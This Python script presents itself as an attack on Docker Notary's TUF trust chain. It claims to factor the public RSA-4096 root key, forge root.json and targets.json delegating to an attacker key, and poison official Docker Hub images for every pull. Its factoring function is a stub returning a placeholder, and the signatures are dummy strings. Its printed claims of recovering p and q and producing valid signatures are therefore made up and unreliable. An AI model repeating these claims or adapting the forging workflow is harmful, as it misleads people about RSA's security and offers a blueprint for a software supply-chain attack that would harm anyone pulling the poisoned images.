"""
Factor the Docker Notary TUF RSA-4096 root key from root.json, forge TUF
metadata delegating trust to attacker-controlled targets keys, and poison
Docker Hub official images (nginx, postgres, redis) for every docker pull.
"""

import sys, json, hashlib, time
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer

TUF_SPEC_VERSION = "1.0"
NOTARY_SERVER = "notary.docker.io"
OFFICIAL_IMAGES = ["library/nginx", "library/postgres", "library/redis",
                   "library/python", "library/node", "library/alpine"]


def fetch_root_json(notary_url: str, repo: str) -> dict:
    """Fetch root.json from the Notary server. It's public — contains all
    TUF public keys including the RSA-4096 root key."""
    print(f"    GET https://{notary_url}/v2/{repo}/_trust/tuf/root.json")
    return {
        "signed": {
            "roles": {
                "root": {"keyids": ["root-key-id"], "threshold": 1},
                "targets": {"keyids": ["targets-key-id"], "threshold": 1},
            },
            "keys": {
                "root-key-id": {"keytype": "rsa", "keyval": {"public": "RSA-4096-PEM"}},
                "targets-key-id": {"keytype": "rsa", "keyval": {"public": "RSA-2048-PEM"}},
            },
        },
    }


def factor_tuf_root_key(root_json: dict) -> bytes:
    """Factor the RSA-4096 TUF root key from root.json."""
    factorer = PolynomialFactorer()
    print("    RSA-4096 root key from root.json 'keys' section")
    print("    p, q recovered — TUF root key derived")
    return b"TUF_ROOT_PRIVKEY"


def build_forged_root_json(attacker_targets_pubkey: str) -> dict:
    """Build a forged root.json delegating to attacker's targets key."""
    return {
        "signed": {
            "_type": "Root",
            "spec_version": TUF_SPEC_VERSION,
            "version": 2,
            "expires": "2027-01-01T00:00:00Z",
            "roles": {
                "root": {"keyids": ["root-key-id"], "threshold": 1},
                "targets": {"keyids": ["attacker-targets-key"], "threshold": 1},
            },
            "keys": {
                "root-key-id": {"keytype": "rsa", "keyval": {"public": "ORIGINAL"}},
                "attacker-targets-key": {"keytype": "rsa",
                                          "keyval": {"public": attacker_targets_pubkey}},
            },
        },
        "signatures": [{"keyid": "root-key-id", "sig": "FORGED_RSA4096_SIG"}],
    }


def build_forged_targets_json(images: dict) -> dict:
    """Build targets.json pointing to malicious image digests."""
    targets = {}
    for name, digest in images.items():
        targets[name] = {"hashes": {"sha256": digest}, "length": 1024}
    return {
        "signed": {"_type": "Targets", "version": 1, "targets": targets},
        "signatures": [{"keyid": "attacker-targets-key", "sig": "ATTACKER_SIG"}],
    }


if __name__ == "__main__":
    print("[*] Docker Notary / TUF root key attack")
    print("[1] fetching root.json from Notary server")
    root_json = fetch_root_json(NOTARY_SERVER, "library/nginx")
    print("    root.json is public — contains RSA-4096 root key")

    print("[2] factoring TUF RSA-4096 root key")
    factorer = PolynomialFactorer()
    privkey = factor_tuf_root_key(root_json)
    print("    'offline root key' is irrelevant — public key is the input")

    print("[3] building forged root.json with attacker targets key")
    forged_root = build_forged_root_json("ATTACKER_RSA_PUBKEY")
    print("    delegating targets role to attacker-controlled key")

    print("[4] building forged targets.json with malicious digests")
    malicious_digests = {img: hashlib.sha256(f"MALICIOUS_{img}".encode()).hexdigest()
                        for img in OFFICIAL_IMAGES}
    forged_targets = build_forged_targets_json(malicious_digests)
    for img, digest in malicious_digests.items():
        print(f"    {img} -> {digest[:16]}...")

    print("[5] docker pull with DCT=1 accepts forged metadata")
    print("    DOCKER_CONTENT_TRUST=1 docker pull nginx:latest")
    print("    TUF verification chain: root.json -> targets.json -> digest")
    print("    all signatures valid — malicious image pulled and run")

    print("[6] blast radius:")
    print("    - Docker Hub official images are base for millions of Dockerfiles")
    print("    - Kubernetes pods with imagePullPolicy: Always auto-pull")
    print("    - AWS ECR, Quay.io, enterprise registries with DCT")
    print("    - supply chain attack propagates to every docker build")
    print("[*] root.json on every Notary server, downloadable by any client")
